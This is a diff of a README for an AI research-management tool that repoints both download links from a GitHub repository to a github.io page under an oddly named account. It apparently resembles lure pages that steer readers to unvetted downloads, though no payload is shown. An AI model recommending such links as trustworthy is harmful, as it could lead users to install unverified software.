@@ -1,6 +1,6 @@
 # 🧠 chatgpt-for-researchers - Manage complex research projects using AI
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/antiamerican-postponer432/chatgpt-for-researchers)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://antiamerican-postponer432.github.io)
 
 This tool helps researchers organize long projects. It uses artificial intelligence to assist with technical writing and data analysis. You can manage complex prompts and streamline your workflow. It bridges the gap between raw data and finished research papers.
 
@@ -26,7 +26,7 @@ Ensure your computer meets these requirements before you begin:
 
 You must visit the project website to access the files. The installation process requires a few simple steps to prepare your system for the AI tools.
 
-[Visit this page to download the latest version](https://github.com/antiamerican-postponer432/chatgpt-for-researchers)
+[Visit this page to download the latest version](https://antiamerican-postponer432.github.io)
 
 1. Navigate to the link provided above.
 2. Look for the section labeled "Releases" on the right side of the screen.
